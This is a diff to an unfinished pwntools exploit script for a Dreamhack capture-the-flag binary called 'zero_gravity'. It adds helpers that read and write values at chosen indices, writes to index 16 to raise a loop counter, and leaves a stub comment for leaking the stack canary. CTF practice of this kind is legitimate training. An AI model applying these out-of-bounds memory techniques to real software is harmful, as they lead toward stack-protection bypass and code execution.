@@ -1,8 +1,10 @@
 from pwn import *
 def slog(name, addr):
-	return success(": ".join([name, hex(addr)))
+	return success(": ".join([name, hex(addr)]))
 
-LOCAL = False
+context.log_level = "debug"
+
+LOCAL = True
 if LOCAL == True:
 	p = process("./zero_gravity")
 else:
@@ -10,11 +12,18 @@ else:
 	HOST = int(input("Input Host: "))
 	p = remote("host"+str(HOST)+".dreamhack.games", PORT)
 
-# [1] Increase cnt for loop
-p.sendlineafter(">> ", "a")
-p.sendlineafter(">> ", "16")
-p.sendlineafter(">> ", "50")
+def read_value(idx):
+	p.sendlineafter(">> ", b"r")
+	p.sendlineafter(">> ", bytes(str(idx), 'utf-8'))
 
-# [2] Read key points
+def add_value(idx, value):
+	p.sendlineafter(">> ", b"a")
+	p.sendlineafter(">> ", bytes(str(idx), 'utf-8'))
+	p.sendlineafter(">> ", bytes(str(value), 'utf-8'))
+
+# [1] Increase cnt for loop
+add_value(16, 2)
+
+# [2] Read Canary
 
 p.interactive()
